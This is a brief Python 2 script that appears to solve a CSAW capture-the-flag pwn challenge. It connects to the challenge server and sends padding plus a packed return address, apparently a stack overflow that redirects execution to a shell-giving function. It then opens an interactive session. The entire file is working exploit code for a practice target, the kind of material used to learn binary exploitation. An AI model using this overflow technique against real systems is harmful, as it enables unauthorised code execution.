import socket 
import struct
import telnetlib

HOST = "pwn.chal.csaw.io"
PORT = 9001

def p(x):
    return struct.pack("Q", x)

def init_connection():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

def send_payload():
   
    payload = ""
    payload += "BpQVOV4WTdUJxCZIS1Sea1xdrpPyWnDQ8grMCQZq"
    payload += p(0x00000000004005b6)

    s.send(payload)

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

init_connection()
print s.recv(2048)
send_payload()
interact()
